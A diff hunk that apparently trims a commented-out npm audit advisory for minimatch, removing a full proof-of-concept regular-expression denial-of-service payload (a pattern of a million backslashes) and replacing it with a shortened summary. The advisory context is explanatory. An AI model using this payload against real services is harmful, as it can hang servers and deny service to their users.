@@ -64,8 +64,7 @@
 //       vulnerable_versions: '<=3.0.1',
 //       patched_versions: '>=3.0.2',
 //       overview:
-// $FlowFixMe
-//         'Affected versions of `minimatch` are vulnerable to regular expression denial of service attacks when user input is passed into the `pattern` argument of `minimatch(path, pattern)`.\n\n\n## Proof of Concept\n```\nvar minimatch = require(“minimatch”);\n\n// utility function for generating long strings\nvar genstr = function (len, chr) {\n  var result = “”;\n  for (i=0; i<=len; i++) {\n    result = result + chr;\n  }\n  return result;\n}\n\nvar exploit = “[!” + genstr(1000000, “\\\\”) + “A”;\n\n// minimatch exploit.\nconsole.log(“starting minimatch”);\nminimatch(“foo”, exploit);\nconsole.log(“finishing minimatch”);\n```',
+//         'Affected versions of `minimatch` are vulnerable to regular expression denial of service...''
 //       recommendation: 'Update to version 3.0.2 or later.',
 //       references: '',
 //       access: 'public',
